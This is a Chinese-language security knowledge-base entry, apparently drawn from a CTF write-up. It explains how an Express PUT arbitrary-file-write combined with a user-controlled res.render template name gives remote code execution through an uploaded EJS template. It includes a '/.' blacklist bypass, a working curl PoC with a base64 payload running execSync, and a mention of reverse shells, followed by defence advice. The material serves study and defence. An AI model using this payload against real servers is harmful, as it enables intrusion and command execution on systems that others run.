---
id: web-nodejs-ssti-express-put-upload-res-render-template-name-rce
title: Express PUT 任意文件写入 + res.render(templ) 模板名可控：上传 EJS 到 views 实现 RCE
type: scenario
domain: web
path: web/nodejs/ssti
technique: express-put-upload-render-template-name-ejs-rce
aliases:
- Express PUT 任意文件写入
- res.render 模板名可控
- EJS 模板上传 RCE
- views 目录写模板
- 末尾 /. 绕过黑名单
tags:
- nodejs
- express
- ejs
- ssti
- file-upload
- put
- template-name
- path-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:11+08:00'
  notes: 已对照原文与全部 89 张图片核对；PUT 写入 /views/test.ejs/. 与 res.render(templ) 链一致；未在目标复现
---

## 一句话结论

Express 静态服务器的 `PUT /*` 把 base64 内容写到 `path.join(STATIC_DIR, req.path)`，而目录请求又用 `res.render(req.query.templ || 'index')` 渲染用户指定的模板名；攻击者把 EJS 模板写到 `/views/test.ejs/.`（`path.join` 会把末尾 `/.` 归一化掉，同时原始 `req.path` 不以 `js` 结尾、不含 `..`，绕过 `/\\.\\.|js$/` 黑名单），再请求 `/views/?templ=test.ejs`，EJS 编译执行 `<%= process.mainModule.require('child_process').execSync('id') %>`，形成 RCE。

## 原理

- PUT 处理器没有做路径白名单或类型校验，`fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'))` 会把任意 base64 内容写到 STATIC_DIR 下任意路径。
- 中间件黑名单 `/js$|\\.\\./i` 只检查 `req.path`：路径末尾不能是 `js`、不能含 `..`。攻击者在文件名后加 `/.`，原始 `req.path` 为 `/views/test.ejs/.`，不以 `js` 结尾也不含 `..`，通过检查；而 `path.join` 在拼接时会归一化掉 `/.`，实际写入 `/views/test.ejs`。
- `serveIndex` 在路径以 `/` 结尾时调用 `res.render(templ, {...})`，`templ` 完全来自 `req.query.templ`，没有白名单；EJS 把模板文件编译执行，`<%= %>` 中的 Node.js 表达式可访问 `process.mainModule.require`，进而执行系统命令。
- 该链成立需要 PUT 写入、模板目录可写、模板名可控、EJS 渲染用户文件四个条件同时满足。

## 触发条件

- Express 应用启用 `app.put('/*')` 或类似任意写入接口，且内容/路径可控。
- 静态目录包含 `views` 模板目录，进程对其有写权限。
- 存在 `res.render(req.query.templ, ...)` 或等价“按用户输入模板名渲染”的代码。
- 模板引擎为 EJS（或可执行表达式的引擎）。

## 利用步骤

1. 确认 PUT 接口可写：`PUT /views/test.ejs/.`，body 为 `{"content":"<base64 EJS>"}`。
2. EJS 内容示例：`<%= process.mainModule.require('child_process').execSync('id') %>`。
3. 访问 `GET /views/?templ=test.ejs` 触发渲染，观察命令输出。
4. 若模板缓存导致不生效，可换文件名或重启；成功后用 `readflag`/反弹 shell 继续。

## PoC

```bash
curl -X PUT "http://target/views/test.ejs/." \
  -H 'Content-Type: application/json' \
  --data '{"content":"PGgxPjwlPSBwcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpICU+PC9oMT4="}'
curl "http://target/views/?templ=test.ejs"
```

解码后的 EJS：`<h1><%= process.mainModule.require('child_process').execSync('id') %></h1>`

## 变体与关联

- 黑名单绕过：`/.`、`%2e`、大小写、双重编码；只要 `path.join` 归一化后落到目标文件即可。
- 模板引擎变体：Pug/Handlebars/doT 的用户可控模板名；EJS 的 `include`/`renderFile`。
- 写入方式变体：PUT、multipart 上传、压缩包解压、日志写入。
- 关联：EJS 内容字段注入、JWT 弱密钥触发 EJS 模板注入、任意文件写入到模板目录。

## 检测与防御

- 禁止在生产环境暴露 PUT/任意写入接口；上传目录与模板目录分离，模板目录只读。
- `res.render` 的模板名必须来自白名单，不能使用用户输入。
- 路径校验使用 `path.resolve` 后比较前缀，拒绝 `..` 与规范化后越界；不要只依赖字符串黑名单。
- EJS 渲染不可信模板时使用沙箱/受限上下文，禁用 `process`/`require`。
